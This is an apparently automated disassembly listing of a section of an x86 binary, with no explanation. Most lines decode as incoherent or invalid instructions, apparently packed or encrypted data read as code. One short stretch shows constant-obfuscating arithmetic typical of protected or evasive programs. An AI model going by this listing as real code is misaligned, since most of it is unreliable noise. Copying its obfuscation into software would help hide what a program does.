  41de25:	mov    eax,ds:0x724fa98e
  41de2a:	sbb    eax,0xf06a356c
  41de2f:	ret    
  41de30:	fst    QWORD PTR ds:0x3815ab2f
  41de36:	xor    esp,DWORD PTR ds:0x7f11a161
  41de3c:	xchg   BYTE PTR [eax-0x52589f91],bl
  41de42:	fild   DWORD PTR [eax+0x52b97de0]
  41de48:	jmp    0xc99354d9
  41de4d:	cwde   
  41de4e:	jle    0x41de41
  41de50:	or     esi,DWORD PTR [ecx]
  41de52:	fs xchg esi,eax
  41de54:	adc    ch,BYTE PTR [ebp-0x3712615d]
  41de5a:	shr    al,1
  41de5c:	fmul   QWORD PTR [ecx+esi*8+0x3]
  41de60:	and    edx,DWORD PTR [ebx-0x78e600f4]
  41de66:	outs   dx,DWORD PTR ds:[esi]
  41de67:	and    BYTE PTR ds:0x61605281,0x89
  41de6e:	fbld   TBYTE PTR [eax+0x41]
  41de71:	aad    0x5e
  41de73:	daa    
  41de74:	js     0x41de40
  41de76:	(bad)  
  41de77:	jns    0x41deaa
  41de79:	jbe    0x41def9
  41de7b:	ror    dl,1
  41de7d:	jmp    0x8ba4:0x2fc973a1
  41de84:	and    DWORD PTR [ebx-0x63],esp
  41de87:	ja     0x41de34
  41de89:	adc    BYTE PTR [eax-0x3e],bh
  41de8c:	shr    ecx,cl
  41de8e:	in     al,0x78
  41de90:	jno    0x41dec0
  41de92:	(bad)  
  41de94:	int    0x8a
  41de96:	retf   
  41de97:	rcl    DWORD PTR [edi+edx*2+0x1ba3aa51],cl
  41de9e:	cld    
  41de9f:	mov    edi,0x44732882
  41dea4:	xchg   BYTE PTR [edi],ch
  41dea6:	sub    edi,DWORD PTR [ebp-0x4a]
  41dea9:	iret   
  41deaa:	rcr    al,cl
  41deac:	scas   al,BYTE PTR es:[edi]
  41dead:	push   ecx
  41deae:	es jae 0x9c60
  41deb4:	stos   DWORD PTR es:[edi],eax
  41deb5:	sub    ecx,DWORD PTR [edx-0x7af3adae]
  41debb:	pop    es
  41debc:	retf   0x6043
  41debf:	test   al,0x4e
  41dec1:	jae    0x41df1c
  41dec3:	mov    ah,0x18
  41dec5:	into   
  41dec6:	mov    al,BYTE PTR [ecx-0x6b03f816]
  41decc:	iret   
  41decd:	sti    
  41dece:	(bad)  
  41decf:	stos   DWORD PTR es:[edi],eax
  41ded0:	je     0x41df42
  41ded2:	pop    ecx
  41ded3:	(bad)  
  41ded4:	out    dx,eax
  41ded5:	cwde   
  41ded6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ded7:	and    eax,DWORD PTR [esp-0x30319b04]
  41dede:	inc    edx
  41dedf:	into   
  41dee0:	inc    ebp
  41dee1:	out    0xd0,eax
  41dee3:	adc    BYTE PTR [esi-0x7491134c],0x9b
  41deea:	loop   0x41ded3
  41deec:	and    al,0x97
  41deee:	popf   
  41deef:	mov    ecx,0x7a75a2f
  41def4:	shl    DWORD PTR [ebp+0x2b],1
  41def7:	leave  
  41def8:	scas   eax,DWORD PTR es:[edi]
  41def9:	data16 (bad) 
  41defb:	int3   
  41defc:	jo     0x41deaf
  41defe:	test   DWORD PTR [eax+eax*2],eax
  41df01:	fcmovne st,st(4)
  41df03:	push   cs
  41df04:	out    dx,al
  41df05:	and    esi,edx
  41df07:	add    esp,DWORD PTR [eax]
  41df09:	ja     0x41de9d
  41df0b:	sbb    eax,0xa782203
  41df10:	mov    DWORD PTR [eax],ebp
  41df12:	sbb    BYTE PTR ds:0xf0cb17bc,cl
  41df18:	pop    ds
  41df19:	jp     0x41ded9
  41df1b:	(bad)  
  41df1c:	jle    0x41df0a
  41df1e:	fld    QWORD PTR [esi+0x472c7383]
  41df24:	outs   dx,BYTE PTR ds:[esi]
  41df25:	mov    edx,DWORD PTR [edx-0x41]
  41df28:	aas    
  41df29:	fwait
  41df2a:	pop    ebx
  41df2b:	jne    0x41dedc
  41df2d:	lock mov ch,0xcf
  41df30:	mov    ebx,0x3c1e62ae
  41df35:	inc    esp
  41df36:	adc    bl,BYTE PTR [ecx-0x6b]
  41df39:	fcmove st,st(7)
  41df3b:	popf   
  41df3c:	js     0x41df3d
  41df3e:	jle    0x41df16
  41df40:	mov    DWORD PTR [edi+0x55],edi
  41df43:	sahf   
  41df44:	push   esi
  41df45:	or     dh,BYTE PTR [ecx]
  41df47:	cld    
  41df48:	data16 loop 0x41df80
  41df4b:	xor    bl,BYTE PTR [ecx-0x5f]
  41df4e:	imul   sp,WORD PTR [eax],0xfff9
  41df52:	popf   
  41df53:	mov    ebp,0x187da2dd
  41df58:	pop    edx
  41df59:	add    esp,DWORD PTR [ecx]
  41df5b:	xchg   edi,eax
  41df5c:	mov    al,0xb1
  41df5e:	jmp    0xc81898f1
  41df63:	sub    edx,DWORD PTR [ebx-0x7c]
  41df66:	cmc    
  41df67:	or     BYTE PTR [esi+0x17ffa5b2],0x48
  41df6e:	rcr    ebx,cl
  41df70:	pusha  
  41df71:	xor    BYTE PTR [ebx+0x5f9248fa],0x7
  41df78:	sub    cl,BYTE PTR [edx-0x53fe1cfd]
  41df7e:	aad    0xaf
  41df80:	adc    DWORD PTR ds:0x79b2c362,ebx
  41df86:	aas    
  41df87:	pop    ebx
  41df88:	pop    esp
  41df89:	sub    cl,al
  41df8b:	cmp    eax,0xfbfb375f
  41df90:	sar    DWORD PTR [esi-0x5a],cl
  41df93:	xchg   ebx,eax
  41df94:	adc    al,0xb9
  41df96:	lea    ebx,[edi+0x794d16d7]
  41df9c:	mov    esi,DWORD PTR [eax-0x16]
  41df9f:	sub    DWORD PTR fs:[esi-0x31f51602],0xffffffaa
  41dfa7:	cmp    bl,BYTE PTR [edx]
  41dfa9:	xchg   edi,eax
  41dfaa:	sti    
  41dfab:	and    ch,BYTE PTR [ebx-0x515cc6fe]
  41dfb1:	dec    eax
  41dfb2:	mov    ecx,0x553e4cae
  41dfb7:	je     0x41dfdf
  41dfb9:	aad    0xb8
  41dfbb:	adc    eax,0xb5aef12a
  41dfc0:	dec    edi
  41dfc1:	pop    ebp
  41dfc2:	sub    al,0x35
  41dfc4:	fld    TBYTE PTR [ebx]
  41dfc6:	test   BYTE PTR ds:0xedbeaf40,dl
  41dfcc:	les    ecx,FWORD PTR [ebx]
  41dfce:	es (bad) 
  41dfd0:	adc    al,0x17
  41dfd2:	(bad)  
  41dfd4:	in     eax,0x1
  41dfd6:	loop   0x41dfcf
  41dfd8:	jle    0x41dfeb
  41dfda:	or     eax,DWORD PTR [eax-0x35]
  41dfdd:	scas   al,BYTE PTR es:[edi]
  41dfde:	mov    eax,ds:0xf9fb87fd
  41dfe3:	dec    ecx
  41dfe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfe5:	cld    
  41dfe6:	xchg   BYTE PTR [ebp-0x17b0e96c],bh
  41dfec:	sub    DWORD PTR [ebx],0x43
  41dfef:	dec    ecx
  41dff0:	lods   eax,DWORD PTR ds:[esi]
  41dff1:	add    al,BYTE PTR [eax+0x31]
  41dff4:	clc    
  41dff5:	outs   dx,BYTE PTR ds:[esi]
  41dff6:	jo     0x41e072
  41dff8:	xor    ecx,DWORD PTR [edi-0x31]
  41dffb:	in     al,dx
  41dffc:	pusha  
  41dffd:	(bad)  
  41dffe:	cld    
  41dfff:	(bad)  
  41e000:	into   
  41e001:	xor    eax,0xcbce7e8c
  41e006:	ins    DWORD PTR es:[edi],dx
  41e007:	push   ecx
  41e008:	psubsw mm1,QWORD PTR [eax+0x28]
  41e00c:	out    0x4f,eax
  41e00e:	inc    ebx
  41e00f:	add    BYTE PTR [ecx-0x74d556a6],bh
  41e015:	(bad)  
  41e017:	fst    DWORD PTR [ecx+0x4a810418]
  41e01d:	(bad)  
  41e01e:	mov    ds:0x934f758c,al
  41e023:	inc    esi
  41e024:	xchg   edi,eax
  41e025:	loope  0x41e098
  41e027:	sub    esp,edx
  41e029:	sub    DWORD PTR [edi+eiz*4+0x28],esi
  41e02d:	enter  0xe11b,0xdd
  41e031:	in     al,0xbd
  41e033:	jmp    0x41e012
  41e035:	pop    eax
  41e036:	pop    esp
  41e037:	std    
  41e038:	dec    edx
  41e039:	jns    0x41e06c
  41e03b:	inc    esp
  41e03c:	pop    es
  41e03d:	dec    edx
  41e03e:	(bad)  
  41e03f:	(bad)  
  41e040:	shl    BYTE PTR [edx-0x6e],cl
  41e043:	adc    DWORD PTR [ebp+0x7c],0xffffffa0
  41e047:	arpl   WORD PTR [eax-0x3c107a48],bx
  41e04d:	and    eax,0xd2b1c43d
  41e052:	repz mov cl,0x33
  41e055:	fisub  DWORD PTR [ecx*1+0x43fa01e]
  41e05c:	dec    edi
  41e05d:	and    eax,0xe4358038
  41e062:	cli    
  41e063:	rcl    DWORD PTR [esi-0x2075d6d1],0xfa
  41e06a:	push   ss
  41e06b:	aad    0x42
  41e06d:	sbb    al,0xbb
  41e06f:	xor    BYTE PTR [edx+0x4d],bh
  41e072:	int    0x41
  41e074:	dec    esi
  41e075:	stc    
  41e076:	out    0x7e,al
  41e078:	jg     0x41e0c2
  41e07a:	enter  0x6eab,0x35
  41e07e:	(bad)  
  41e07f:	xchg   edi,eax
  41e080:	scas   eax,DWORD PTR es:[edi]
  41e081:	sub    al,0xef
  41e083:	adc    edi,edx
  41e085:	js     0x41e04a
  41e087:	icebp  
  41e088:	jno    0x41e047
  41e08a:	pop    esi
  41e08b:	int    0xb0
  41e08d:	push   esi
  41e08e:	aad    0x1f
  41e090:	mov    bh,0xa5
  41e092:	inc    ebp
  41e093:	cli    
  41e094:	call   0xe1b7d147
  41e099:	das    
  41e09a:	push   ecx
  41e09b:	dec    esp
  41e09c:	pop    esp
  41e09d:	mov    dl,0x3
  41e09f:	dec    esp
  41e0a0:	add    eax,DWORD PTR [esi-0x3e]
  41e0a3:	rcr    DWORD PTR [edi],1
  41e0a5:	(bad)  
  41e0a6:	ja     0x41e0a3
  41e0a8:	sub    edi,esi
  41e0aa:	inc    al
  41e0ac:	jmp    FWORD PTR [eax+0x7a]
  41e0af:	test   eax,0xbb51e07c
  41e0b4:	loope  0x41e0ca
  41e0b6:	ds ret 
  41e0b8:	imul   edi,ebx,0x45c0eea5
  41e0be:	mov    ebp,0xcc58f8b
  41e0c3:	adc    ah,0xa0
  41e0c6:	mov    ds:0x4edf89db,eax
  41e0cb:	jae    0x41e0b9
  41e0cd:	(bad)  
  41e0ce:	xchg   ebx,eax
  41e0cf:	fisttp QWORD PTR [ecx]
  41e0d1:	xchg   ecx,eax
  41e0d2:	adc    DWORD PTR [esi+0x5a],esp
  41e0d5:	ret    
  41e0d6:	mov    edx,0x2fefcb51
  41e0db:	and    al,0xaf
  41e0dd:	scas   al,BYTE PTR es:[edi]
  41e0de:	std    
  41e0df:	ror    ch,cl
  41e0e1:	adc    edx,DWORD PTR [ebp+0x25]
  41e0e4:	repz push ebp
  41e0e6:	(bad)  
  41e0e7:	in     al,0xe5
  41e0e9:	rol    BYTE PTR [edi+eax*2-0x47],0xf8
  41e0ee:	ror    bl,cl
  41e0f0:	clc    
  41e0f1:	mov    ds:0xa99d91ac,al
  41e0f6:	mov    dh,0xf6
  41e0f8:	lock inc edi
  41e0fa:	lods   al,BYTE PTR ds:[esi]
  41e0fb:	push   edx
  41e0fc:	fwait
  41e0fd:	test   BYTE PTR [eax-0x7e],ch
  41e100:	in     al,0x55
  41e102:	mov    bl,0x92
  41e104:	cli    
  41e105:	test   al,0xd3
  41e107:	adc    eax,DWORD PTR [ebx]
  41e109:	jmp    0xe3e0:0x3221bbb2
  41e110:	push   es
  41e111:	sbb    eax,ebx
  41e113:	add    ebx,DWORD PTR [edx+ebp*4]
  41e116:	fs imul eax,edi,0x1a102444
  41e11d:	inc    edx
  41e11e:	add    BYTE PTR [eax],al
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	sbb    dh,BYTE PTR [ebx]
  41e1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f4:	mov    esp,0x18163fc6
  41e1f9:	mov    esp,0x79181812
  41e1fe:	ja     0x41e23a
  41e200:	loope  0x41e216
  41e202:	nop
  41e203:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e205:	jb     0x41e1d9
  41e207:	out    dx,al
  41e208:	(bad)  fs:[ebp+0x2bdcbe10]
  41e20f:	div    dh
  41e211:	adc    eax,0xd4b71801
  41e216:	ja     0x41e226
  41e218:	mov    eax,0x9ab184a5
  41e21d:	push   ecx
  41e21e:	or     esp,ebp
  41e220:	mov    edi,0x30054064
  41e225:	fild   DWORD PTR [ecx-0x557d5598]
  41e22b:	ds dec edi
  41e22d:	nop
  41e22e:	jae    0x41e258
  41e230:	test   al,0xf7
  41e232:	xor    al,0x5
  41e234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e235:	or     edx,DWORD PTR [edx-0xe]
  41e238:	shl    dh,0x92
  41e23b:	retf   0x3fab
  41e23e:	std    
  41e23f:	ins    BYTE PTR es:[edi],dx
  41e240:	or     DWORD PTR [edx-0x608d3a6d],edx
  41e246:	jge    0x41e1d6
  41e248:	sahf   
  41e249:	sbb    DWORD PTR [esi+eiz*1],ecx
  41e24c:	repnz mov bh,0x79
  41e24f:	inc    DWORD PTR [ebx+eax*1-0x48]
  41e253:	sbb    DWORD PTR [eiz*4+0x6595c97],esp
  41e25a:	lock inc edi
  41e25c:	bound  ebp,QWORD PTR [ecx+0x7a]
  41e25f:	stc    
  41e260:	out    dx,al
  41e261:	mov    edx,0xf7204cc2
  41e266:	cmp    eax,eax
  41e268:	mov    al,0xd2
  41e26a:	into   
  41e26b:	lds    esi,FWORD PTR [esi]
  41e26d:	fsubr  QWORD PTR [eax]
  41e26f:	dec    eax
  41e270:	sub    ecx,esp
  41e272:	lods   eax,DWORD PTR ds:[esi]
  41e273:	out    dx,al
  41e274:	fadd   st(2),st
  41e276:	lods   al,BYTE PTR ds:[esi]
  41e277:	inc    esi
  41e278:	(bad)  
  41e279:	sti    
  41e27a:	rol    BYTE PTR [ebx-0x2f],cl
  41e27d:	mov    esi,0xc4d0afd5
  41e282:	mov    DWORD PTR [ebx],0xa8925a18
  41e288:	adc    al,0x43
  41e28a:	cmc    
  41e28b:	mov    ch,0xa4
  41e28d:	xchg   esi,eax
  41e28e:	pop    edx
  41e28f:	add    ah,BYTE PTR [ecx]
  41e291:	test   al,0xf1
  41e293:	test   BYTE PTR [edi+0x26],bl
  41e296:	pushf  
  41e297:	ja     0x41e2ee
  41e299:	int3   
  41e29a:	mov    edx,0x17056901
  41e29f:	or     eax,0x6230a89c
  41e2a4:	dec    edx
  41e2a5:	mov    ah,ch
  41e2a7:	mov    dl,0x20
  41e2a9:	cdq    
  41e2aa:	loopne 0x41e256
  41e2ac:	push   ebp
  41e2ad:	mov    eax,0xdce7b563
  41e2b2:	repnz cmp al,0x20
  41e2b5:	inc    esp
  41e2b6:	mov    BYTE PTR [ecx],al
  41e2b8:	shr    BYTE PTR [ebp+0x3d],0x89
  41e2bc:	cmp    al,0xf
  41e2be:	inc    ebx
  41e2bf:	and    eax,0x67883c6b
  41e2c4:	ins    BYTE PTR es:[edi],dx
  41e2c5:	pop    edx
  41e2c6:	cs add al,0x53
  41e2c9:	ds pop es
  41e2cb:	pop    es
  41e2cc:	pop    es
  41e2cd:	sbb    esi,DWORD PTR [ecx-0x1b7532ad]
  41e2d3:	call   DWORD PTR [eax]
  41e2d5:	shl    DWORD PTR [edi-0x1c47c2],1
  41e2db:	jmp    0xcb047ea3
  41e2e0:	inc    eax
  41e2e1:	mov    edi,0x7cf054a1
  41e2e6:	sar    DWORD PTR [bp+di-0x16f9],cl
  41e2eb:	in     al,dx
  41e2ec:	(bad)  
  41e2ed:	out    0x3d,eax
  41e2ef:	scas   eax,DWORD PTR es:[edi]
  41e2f0:	mov    ebx,0xf90dc1f3
  41e2f5:	punpcklwd mm0,DWORD PTR [edx]
  41e2f8:	sub    al,BYTE PTR [ebx+0x179fd3c5]
  41e2fe:	or     ebx,esi
  41e300:	adc    eax,DWORD PTR [esi]
  41e302:	(bad)  
  41e303:	fisub  WORD PTR [ebx]
  41e305:	mov    bh,0x2
  41e307:	xor    BYTE PTR [ecx],ah
  41e309:	mov    ebp,0x290bca78
  41e30e:	cdq    
  41e30f:	push   0xffffffd0
  41e311:	xchg   BYTE PTR [edx],cl
  41e313:	xchg   esi,eax
  41e314:	arpl   cx,sp
  41e316:	fbstp  TBYTE PTR [edi-0x63]
  41e319:	push   ebx
  41e31a:	jb     0x41e2bf
  41e31c:	sbb    dh,0x98
  41e31f:	enter  0xc94b,0xd9
  41e323:	mov    ds:0xabaf4a83,al
  41e328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e329:	shl    DWORD PTR ds:0xd448eaf4,cl
  41e32f:	enter  0x3bea,0xa7
  41e333:	pop    ds
  41e334:	xchg   edx,eax
  41e335:	inc    ebp
  41e336:	cli    
  41e337:	ror    ebp,1
  41e339:	ins    BYTE PTR es:[edi],dx
  41e33a:	xor    DWORD PTR [ebx],eax
  41e33c:	adc    esp,ebx
  41e33e:	push   ecx
  41e33f:	fidivr WORD PTR [ebx+0x7d0d85bb]
  41e345:	jo     0x41e301
  41e347:	std    
  41e348:	shl    BYTE PTR [eax],1
  41e34a:	das    
  41e34b:	stos   BYTE PTR es:[edi],al
  41e34c:	rcr    DWORD PTR [eax-0x39cd9e1a],1
  41e352:	stos   BYTE PTR es:[edi],al
  41e353:	sub    eax,0x94af55be
  41e358:	ins    BYTE PTR es:[edi],dx
  41e359:	inc    eax
  41e35a:	cmp    ch,BYTE PTR [ebp-0x738ce4ae]
  41e360:	jmp    0xcff9fb51
  41e365:	ins    DWORD PTR es:[edi],dx
  41e366:	not    DWORD PTR [edx+0x7b514189]
  41e36c:	sbb    DWORD PTR [ebx+0xf],ebp
  41e36f:	pop    es
  41e370:	arpl   WORD PTR [edx+eax*2-0x34d68739],cx
  41e377:	das    
  41e378:	mov    ch,0x18
  41e37a:	ficomp DWORD PTR [ebx+eax*2]
  41e37d:	cli    
  41e37e:	mov    al,0xe
  41e380:	cmp    eax,DWORD PTR [ecx]
  41e382:	jg     0x41e351
  41e384:	mov    ah,0x2c
  41e386:	ins    BYTE PTR es:[edi],dx
  41e387:	jo     0x41e389
  41e389:	adc    al,0xef
  41e38b:	cmp    eax,0x48d896e6
  41e390:	mov    esp,DWORD PTR [ecx]
  41e392:	jne    0x41e33c
  41e394:	adc    BYTE PTR [ebx+0x49d095c6],bl
  41e39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e39b:	mov    eax,es
  41e39d:	ss xchg edi,eax
  41e39f:	aad    0x98
  41e3a1:	mov    ch,0xce
  41e3a3:	test   BYTE PTR [esi+esi*1+0x4a0574a0],cl
  41e3aa:	fs cdq 
  41e3ac:	xchg   ecx,eax
  41e3ad:	aam    0x53
  41e3af:	fwait
  41e3b0:	mov    ecx,0xaeac32dd
  41e3b5:	cmp    eax,0xc4da3f6
  41e3ba:	push   0x8be2281f
  41e3bf:	mov    esi,0xe02c7fd2
  41e3c4:	dec    esp
  41e3c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3c6:	sti    
  41e3c7:	dec    esi
  41e3c8:	enter  0xbf15,0x54
  41e3cc:	sub    ah,BYTE PTR [ebx]
  41e3ce:	jns    0x41e395
  41e3d0:	mov    ecx,0xfc47b85
  41e3d5:	xor    BYTE PTR [edi],0x15
  41e3d8:	cmp    bh,BYTE PTR [edx+0x652e8a42]
  41e3de:	sahf   
  41e3df:	nop
  41e3e0:	int3   
  41e3e1:	out    0x13,al
  41e3e3:	xchg   BYTE PTR [esp+ecx*2+0x2f],ah
  41e3e7:	ins    DWORD PTR es:[edi],dx
  41e3e8:	jge    0x41e45e
  41e3ea:	ins    DWORD PTR es:[edi],dx
  41e3eb:	fst    DWORD PTR [edx-0x7d]
  41e3ee:	scas   al,BYTE PTR es:[edi]
  41e3ef:	push   ecx
  41e3f0:	sti    
  41e3f1:	and    dh,BYTE PTR [ebx-0x5097bc50]
  41e3f7:	mov    ebx,0xcab11089
  41e3fc:	retf   
  41e3fd:	fist   DWORD PTR [eax]
  41e3ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e400:	jmp    0x1e2c:0xf45d69bc
  41e407:	xchg   esi,eax
  41e408:	adc    eax,0xdb684fa6
  41e40d:	sbb    ebp,esp
  41e40f:	xor    eax,DWORD PTR [ebx+edi*8]
  41e412:	leave  
  41e413:	mov    esp,0x2407ac1c
  41e418:	out    0xa,al
  41e41a:	ret    0xc5d5
  41e41d:	js     0x41e3be
  41e41f:	cmp    ch,BYTE PTR [eax+0x5d]
  41e422:	push   ss
  41e423:	jbe    0x41e47e
  41e425:	xlat   BYTE PTR ds:[ebx]
  41e426:	fistp  WORD PTR [ecx]
  41e428:	add    DWORD PTR [eax+0x72bdeaf9],edx
  41e42e:	push   edx
  41e42f:	xor    esp,ebx
  41e431:	sub    eax,0xc329b9fe
  41e436:	xchg   ebx,eax
  41e437:	cld    
  41e438:	cmp    eax,0x79de73c4
  41e43d:	shl    DWORD PTR [edi-0x1371d8f8],1
  41e443:	sub    BYTE PTR [esi+0x56d63b5d],al
  41e449:	xor    DWORD PTR [ecx+0x563737bd],ebp
  41e44f:	push   eax
  41e450:	jecxz  0x41e494
  41e452:	mov    eax,ds:0xe9cb13cb
  41e457:	or     ch,cl
  41e459:	aam    0xe
  41e45b:	pop    ss
  41e45c:	mov    BYTE PTR [ebp-0x4f69ecf2],dl
  41e462:	xor    eax,0xc2176d9b
  41e467:	sub    al,0xa8
  41e469:	and    bl,al
  41e46b:	pop    ss
  41e46c:	lea    ebp,[edx]
  41e46e:	stc    
  41e46f:	mov    bh,0xf
  41e471:	hlt    
  41e472:	dec    ebp
  41e473:	sub    BYTE PTR [ecx+0x71],bl
  41e476:	mov    esp,0x52581ae8
  41e47b:	je     0x41e4f1
  41e47d:	mov    esi,0x5bb2780
  41e482:	ret    
  41e483:	test   DWORD PTR [edx+0x7345a95c],0x18ddf0b
  41e48d:	call   0xc74ecea7
  41e492:	out    0xb5,eax
  41e494:	retf   0x193c
  41e497:	data16 jbe 0x41e459
  41e49a:	xor    eax,0x880df072
  41e49f:	jle    0x41e4ce
  41e4a1:	sub    eax,0x3a60894a
  41e4a6:	push   ds
  41e4a7:	mov    ecx,0x61cf5c93
  41e4ac:	and    al,0xf0
  41e4ae:	icebp  
  41e4af:	pop    ecx
  41e4b0:	call   0x9765:0xd73a0b18
  41e4b7:	lods   al,BYTE PTR ds:[esi]
  41e4b8:	inc    ebx
  41e4b9:	popf   
  41e4ba:	arpl   WORD PTR [edi-0x7a81845f],bx
  41e4c0:	movaps xmm1,XMMWORD PTR [edi-0x3d]
  41e4c4:	jns    0x41e524
  41e4c6:	imul   BYTE PTR [edi-0x72]
  41e4c9:	lods   al,BYTE PTR ds:[esi]
  41e4ca:	(bad)  
  41e4cb:	std    
  41e4cc:	dec    cx
  41e4ce:	fs dec ecx
  41e4d0:	rol    BYTE PTR [esi+ebp*1-0x71],0xc3
  41e4d5:	mov    ds:0x128fa5d,al
  41e4da:	push   0xbffb2f1d
  41e4df:	jmp    0x41e528
  41e4e1:	xor    eax,0xda0b2881
  41e4e6:	sub    ecx,DWORD PTR [esi+0x5eeda033]
  41e4ec:	iret   
  41e4ed:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ef:	lea    eax,[esi]
  41e4f1:	mov    ch,0xf5
  41e4f3:	sub    esp,DWORD PTR [esi+ebp*4-0x11e548f0]
  41e4fa:	imul   edi,DWORD PTR [eax+0xf],0x72e74680
  41e501:	push   esi
  41e502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e503:	mov    esp,0xdce131c6
  41e508:	push   esp
  41e509:	in     eax,0xfe
  41e50b:	arpl   WORD PTR [ebx],cx
  41e50d:	xor    al,bl
  41e50f:	xchg   edi,eax
  41e510:	fld    st(0)
  41e512:	inc    esp
  41e513:	lea    edx,[esi-0x6f0467fa]
  41e519:	lock pusha 
  41e51b:	sbb    al,0x73
  41e51d:	out    0x75,eax
  41e51f:	lahf   
  41e520:	add    BYTE PTR [eax+0x349e0065],bh
  41e526:	mov    ebp,0xddbc794
  41e52b:	add    esp,DWORD PTR [ebx-0x7e8c27f6]
  41e531:	push   esi
  41e532:	push   esp
  41e533:	jl     0x41e4eb
  41e535:	mov    al,ds:0x8c5355d2
  41e53a:	sbb    DWORD PTR [ecx-0x4],esi
  41e53d:	retf   
  41e53e:	inc    esi
  41e53f:	sub    BYTE PTR [eax+0x48c38d0],al
  41e545:	popf   
  41e546:	and    DWORD PTR [ecx+0x28],0x45
  41e54a:	shl    BYTE PTR [eax+0x6fe1641f],1
  41e550:	mov    ds:0x1e2735b5,eax
  41e555:	cmp    al,0x67
  41e557:	jns    0x41e57b
  41e559:	in     al,dx
  41e55a:	pop    ebp
  41e55b:	jle    0x41e501
  41e55d:	std    
  41e55e:	mov    cl,0x2b
  41e560:	or     cl,BYTE PTR [ebx-0x3c9ec041]
  41e566:	fsubr  QWORD PTR ds:0x973f04e2
  41e56c:	jne    0x41e584
  41e56e:	repnz ins BYTE PTR es:[edi],dx
  41e570:	int3   
  41e571:	aad    0xcf
  41e573:	jb     0x41e552
  41e575:	push   edx
  41e576:	popa   
  41e577:	imul   edx,esi,0x81308029
  41e57d:	(bad)  
  41e57e:	xor    eax,0x2e67544f
  41e583:	mov    esp,0xfb581af0
  41e588:	push   esi
  41e589:	adc    ebp,DWORD PTR [esi+0x6b]
  41e58c:	mov    dl,0x50
  41e58e:	sub    ecx,DWORD PTR [ecx+0x1a]
  41e591:	pop    es
  41e592:	mov    eax,ds:0x57f9de63
  41e597:	cmp    al,0xf0
  41e599:	daa    
  41e59a:	dec    ecx
  41e59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e59c:	push   edx
  41e59d:	mov    eax,edx
  41e59f:	dec    ebp
  41e5a0:	clc    
  41e5a1:	hlt    
  41e5a2:	xchg   si,ax
  41e5a4:	es xchg esi,eax
  41e5a6:	add    DWORD PTR [esi],ecx
  41e5a8:	inc    edx
  41e5a9:	sbb    edx,eax
  41e5ab:	mov    ds:0xc16beda1,eax
  41e5b0:	loopne 0x41e5b4
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0xb3aae715
  41e5c6:	dec    esi
  41e5c7:	outs   dx,DWORD PTR ds:[esi]
  41e5c8:	mov    al,0x6b
  41e5ca:	aaa    
  41e5cb:	push   ss
  41e5cc:	sbb    BYTE PTR [edx+edx*1+0x4591818],bh
  41e5d3:	ja     0x41e604
  41e5d5:	test   al,0xe6
  41e5d7:	out    0x7f,al
  41e5d9:	addr16 test ah,cl
  41e5dc:	dec    edx
  41e5dd:	xchg   edi,eax
  41e5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5e0:	call   0xdb7f:0xc6c20933
  41e5e7:	ins    BYTE PTR es:[edi],dx
  41e5e8:	rcl    edx,0x24
  41e5eb:	lea    eax,[eax-0x4c]
